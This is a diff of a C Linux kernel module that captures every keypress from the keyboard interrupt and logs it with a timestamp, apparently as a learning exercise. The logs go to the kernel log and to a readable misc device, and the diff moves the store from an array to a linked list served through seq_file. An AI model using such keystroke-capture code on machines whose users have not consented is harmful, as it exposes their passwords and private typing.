@@ -3,92 +3,93 @@
 unsigned char *kbus[] = {US_KBMAP};
 unsigned int stats[97] = {0};
 
-char *device_file[BUFFER_SIZE];
+static LIST_HEAD(file_list);
 int device_size = 0;
-int device_index = 0;
+int exiting = 0;
 
 struct miscdevice misc;
 int misc_open = 0;
 static struct file_operations fops = {
 	.owner = THIS_MODULE,
-	.read = device_read,
-	.open = device_open,
-	.release = device_release,
+	.open = ct_open,
+	.read = seq_read,
+	.llseek = seq_lseek,
+	.release = seq_release,
+};
+static const struct seq_operations seq_ops = {
+        .start = seq_start,
+        .next  = ct_seq_next,
+        .stop  = seq_stop,
+        .show  = seq_show
 };
 
 /* === UTILS === */
 
-static char *strdup(char const *str) {
-	int len = strlen(str);
-	char *result = kmalloc((len + 1) * sizeof(char), GFP_KERNEL);
-	if (!result)
-		return NULL;
-	for (int i = 0; i < len; i++) {
-		result[i] = str[i];
+static log_node *lst_new(struct rtc_time *_time, int _scancode, int _release) {
+	log_node *new;
+	new = kmalloc(sizeof(log_node), GFP_KERNEL);
+
+	new->time = *_time;
+	new->scancode = _scancode;
+	new->release = _release;
+
+	list_add_tail(&new->list, &file_list);
+	return new;
+}
+
+static void log_stats(void) {
+	int max = 0;
+	int sum = 0;
+	for (int i = 0; i < 97; i++) {
+		if (MAPPED(i)) {
+			if (stats[i] > stats[max])
+				max = i;
+			sum += stats[i];
+		}
 	}
-	result[len] = '\0';
-	return result;
+	if (sum > 0) {
+		int ratio = (stats[max]*100)/sum;
+		LOG("you pressed %d keys", sum);
+		LOG("most pressed key is '%s': %d times (%d%%) !",
+				kbus[max], stats[max], ratio);
+	} else {
+		LOG("you pressed no keys :(");
+	}
+}
+
+static void free_file(void) {
+	log_node *pos;
+	log_node *tmp;
+	list_for_each_entry_safe(pos, tmp, &file_list, list) {
+		kfree(pos);
+	}
 }
 
 /* === MISCDEVICE === */
 
-static int device_open(struct inode *inode, struct file *file) {
+static int ct_open(struct inode *inode, struct file *file) {
 	if (misc_open)
 		return -EBUSY;
 	misc_open++;
-	return 0;
+	return seq_open(file, &seq_ops);
 }
 
-static int device_release(struct inode *inode, struct file *file) {
-	misc_open--;
-	return 0;
+static void *seq_start(struct seq_file *s, loff_t *pos) {
+	misc_open = 0;
+	return seq_list_start(&file_list, *pos);
+}
+static void seq_stop(struct seq_file *_s, void *_v) {}
+
+static void *ct_seq_next(struct seq_file *s, void *v, loff_t *pos) {
+	return seq_list_next(v, &file_list, pos);
 }
 
-static ssize_t device_read(struct file *filep, char *u_buffer, size_t len, loff_t *offset) {
-	if (*offset >= device_size)
-		return 0;
-	if (*offset + len > device_size)
-		len = device_size - *offset;
-
-	int i = 0;
-	int j = 0;
-	int total = 0;
-	int bytes = 0;
-
-	// reach the offset
-	while (i < device_index) {
-		int len_str = strlen(device_file[i]) + 1;
-		if (total + len_str >= *offset) {
-			j = *offset - total;
-			break;
-		}
-		total += len_str;
-		i++;
-	}
-
-	// write everything in the user buffer
-	while (i < device_index && len > 0) {
-		while (device_file[i][j] && len > 0) {
-			if (put_user(device_file[i][j], u_buffer++))
-				return -EFAULT;
-			j++;
-			bytes++;
-			len--;
-		}
-
-		if (len > 0) {
-			if (put_user('\n', u_buffer++))
-				return -EFAULT;
-			len--;
-			bytes++;
-		}
-
-		j = 0;
-		i++;
-	}
-
-	*offset += bytes;
-	return bytes;
+static int seq_show(struct seq_file *seq, void *v) {
+	log_node *entry = list_entry(v, log_node, list);
+	seq_printf(seq, "[%ptRt] %s (%d) %s\n",
+			&entry->time, NAME(entry->scancode),
+			entry->scancode, STATE(entry->release));
+	return 0;
 }
 
 static int register_device(void) {
@@ -112,39 +113,17 @@ static void unregister_device(void) {
 
 /* === KEY HANDLER === */
 
-static void add_log_to_file(char *str) {
-	if (device_index < BUFFER_SIZE - 1) {
-		device_file[device_index] = str;
-		device_index++;
-	} else {
-		kfree(device_file[0]);
-		for (int i = 0; i < device_index; i++) {
-			device_file[i] = device_file[i + 1];
-		}
-		device_file[device_index] = str;
-	}
-}
-
 static void add_entry(int scancode, int release, struct rtc_time *time) {
-	char entry[42];
-	int len = scnprintf(entry, 42,
-			"[%ptRt] %s (%d) %s",
-			time, NAME(scancode), scancode, STATE(release));
-
-	if (len <= 0)
-		return ;
-	char *log = strdup(entry);
-	if (log) {
-		add_log_to_file(log);
-		device_size += len;
-	}
-
-	LOG("%s", entry);
+	LOG("[%ptRt] %s (%d) %s", time, NAME(scancode), scancode, STATE(release));
+	lst_new(time, scancode, release);
 	if (!release)
 		STAT(scancode);
 }
 
 static irqreturn_t irq_handler(int irq, void *dev_id) {
+	if (exiting)
+		return IRQ_NONE;
+
 	int scancode = inb(0x60);
 	int release = scancode & RELEASE;
 	scancode &= CANCEL_RELEASE;
@@ -174,29 +153,12 @@ int __init m_init(void) {
 }
 
 void __exit m_exit(void) {
+	exiting = 1;
+
 	unregister_device();
-
-	int max = 0;
-	int sum = 0;
-	for (int i = 0; i < 97; i++) {
-		if (MAPPED(i)) {
-			if (stats[i] > stats[max])
-				max = i;
-			sum += stats[i];
-		}
-	}
-	if (sum > 0) {
-		int ratio = (stats[max]*100)/sum;
-		LOG("you pressed %d keys", sum);
-		LOG("most pressed key is '%s': %d times (%d%%) !", kbus[max], stats[max], ratio);
-	} else {
-		LOG("you pressed no keys :(");
-	}
-
+	log_stats();
+	free_file();
 	free_irq(1, (void *)irq_handler);
-	for (int i = 0; i < device_index; i++) {
-		kfree(device_file[i]);
-	}
 	return;
 }
 
